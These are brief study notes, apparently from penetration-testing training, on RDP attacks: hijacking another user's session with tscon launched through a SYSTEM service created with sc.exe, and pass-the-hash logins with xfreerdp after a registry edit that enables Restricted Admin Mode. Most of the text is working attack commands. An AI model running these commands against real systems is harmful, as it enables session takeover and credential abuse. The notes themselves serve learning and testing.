** Protocol Specific Attacks

*** RDP Session Hijacking
- to impersonate user w/out password -> =SYSTEM= privileges + MS =tscon.exe= (enables users to connect to another desktop session)
- ~tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}~
- local admin priv -> =SYSTEM= priv (*PsExec*, *Mimikatz*)
- create *Windows service* to run as =Local System=, will exec any binary with =SYSTEM= using =sc.ece=
  - ~sc.exe create sessionhijack binpath = "cmd.exe /k tscon <user_id> /dest:rdp-tcp#13"~
  - ~net start sessionhijack~

** RDP PtH
- =Restricted Admin Mode= must be enabled
  - ~reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f~
- ~xfreerdp /v:<ip> /u:<user> /pth:<NTLM_HASH>~
